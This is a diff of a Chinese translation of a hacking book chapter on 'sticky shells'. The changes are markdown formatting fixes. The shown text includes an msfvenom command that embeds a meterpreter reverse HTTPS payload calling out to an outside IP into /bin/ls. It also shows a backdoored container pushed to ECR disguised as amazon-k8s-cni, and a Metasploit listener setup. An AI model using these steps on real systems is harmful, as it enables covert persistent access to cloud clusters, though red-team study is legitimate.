@@ -1,6 +1,4 @@
-# 9
-
-粘性 Shell
+# 粘性 Shell
 
 ![](img/chapterart.png)
 
@@ -69,7 +67,7 @@ Listing 9-2: 一个 Dockerfile，用于构建一个容器，在启动后下载�
 我们前往实验室并生成一个无阶段的原生 HTTPS meterpreter。无阶段负载是完全自包含的，不需要从互联网下载额外的代码来启动。meterpreter 直接注入我们选择的 ELF/PE 二进制文件的*.text*部分（前提是模板文件有足够的空间）。在列表 9-3 中，我们选择了*/bin/ls*二进制文件作为模板，并将反向 shell 嵌入其中。
 
 ```
-root@Point1:~/# **docker run -it phocean/msf ./msfvenom -p \**
+root@Point1:~/# docker run -it phocean/msf ./msfvenom -p \
 **linux/x64/meterpreter_reverse_https \**
 **LHOST=54.229.96.173 \**
 **LURI=/msf \**
@@ -140,15 +138,15 @@ root@Point1:**opt/tmp/# aws s3api put-object \**
 最后，为了进一步增强骗局的网络，当我们构建容器的镜像并将其推送到我们自己的 AWS ECR 注册表时（ECR 相当于 AWS 上的 Docker Hub），我们是在伪装成一个合法的 Amazon 容器，即 amazon-k8s-cni：
 
 ```
-root@Point1:~/# **docker build \**
+root@Point1:~/# docker build \
 **-t 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3 .**
 
 Successfully built be905757d9aa
 Successfully tagged 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3
 
 # Authenticate to ECR
-root@Point1:~/# **$(aws ecr get-login --no-include-email --region eu-west-1)**
-root@Point1:~/# **docker push 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3**
+root@Point1:~/# $(aws ecr get-login --no-include-email --region eu-west-1)
+root@Point1:~/# docker push 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3
 ```
 
 假容器（amazon-k8s-cni）和 S3 存储桶（amazon-cni-plugin-essentials）的名称并非随意选择。EKS 在每个节点上运行一个类似的容器副本，用于管理 Pod 和节点的网络配置，正如我们从任何运行中的集群中获取的 Pod 列表所见：
@@ -213,12 +211,12 @@ shell> **sed "s/ linux/ kafka-broker-collector/g" -i aws-ds-manifest.yaml**
 与此同时，我们返回到我们的 Metasploit 容器，设置一个监听器，在端口 443 上提供类型为 `meterpreter_reverse_https` 的有效载荷，如下所示。这个有效载荷类型当然和我们在本章开始时使用的 `msfvenom` 命令中的类型是相同的：
 
 ```
-root@Point1:~/# **docker ps**
+root@Point1:~/# docker ps
 CONTAINER ID      IMAGE          COMMAND
 8e4adacc6e61      phocean/msf    "/bin/sh -c \"init.sh\""
 
-root@Point1:~/# **docker attach 8e4adacc6e61**
-root@fcd4030:/opt/metasploit-framework# **./msfconsole**
+root@Point1:~/# docker attach 8e4adacc6e61
+root@fcd4030:/opt/metasploit-framework# ./msfconsole
 msf > **use exploit/multi/handler**
 msf multi/handler> **set payload linux/x64/meterpreter_reverse_https**
 msf multi/handler> **set LPORT 443**
